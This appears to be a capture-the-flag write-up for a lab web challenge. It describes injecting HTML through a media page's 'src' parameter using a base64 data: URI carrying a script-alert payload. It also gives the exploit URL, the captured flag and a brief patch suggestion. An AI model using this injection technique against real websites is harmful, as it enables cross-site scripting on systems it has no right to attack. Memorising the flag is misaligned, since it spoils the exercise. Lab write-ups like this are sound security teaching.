# 11_Protect_Your_Media_types

Unsecure media redirection setted in the frontend.
http://192.168.99.100)

## How to see it

Go on the page mentionned before.
Inspect element, it appears that a GET request is done for the prism image. We can see in the request that text/html is an
accepted format. We can deduct than we can inject some HTML there. Then we will just modify the request.
Don't forget to put your url in base 64.
```bash
<script>alert("Hello World")</script> -> base64 -> PHNjcmlwdD5hbGVydCgiaGVsbG8gd29ybGQiKTwvc2NyaXB0Pg==
```
```bash
http://192.168.99.100/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGVsbG8gd29ybGQiKTwvc2NyaXB0Pg==
```
```bash
THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
```
## How to abuse of it

You can insert HTML code since the text/html is accepted

## How to patch it

Just use the type that you want to accept. Check the headers of the file you're using. ID of images pointing to DB.
